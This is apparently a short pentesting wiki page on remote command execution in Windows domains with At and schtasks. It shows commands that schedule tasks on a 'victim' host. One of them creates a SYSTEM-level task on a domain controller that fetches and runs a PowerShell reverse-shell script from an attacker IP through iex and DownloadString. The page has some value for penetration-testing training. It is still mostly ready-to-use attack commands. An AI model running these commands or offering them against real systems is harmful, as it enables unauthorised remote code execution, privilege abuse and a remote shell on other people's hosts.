# AtExec / SchtasksExec

## How Does it works

At allows to schedule tasks in hosts where you know username/\(password/Hash\). So, you can use it to execute commands in other hosts and get the output.

```text
At \\victim 11:00:00PM shutdown -r
```

Using schtasks you need first to create the task and then call it:

```text
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```

More information about the [**use of schtasks with silver tickets here**](../active-directory-methodology/silver-ticket.md#host).

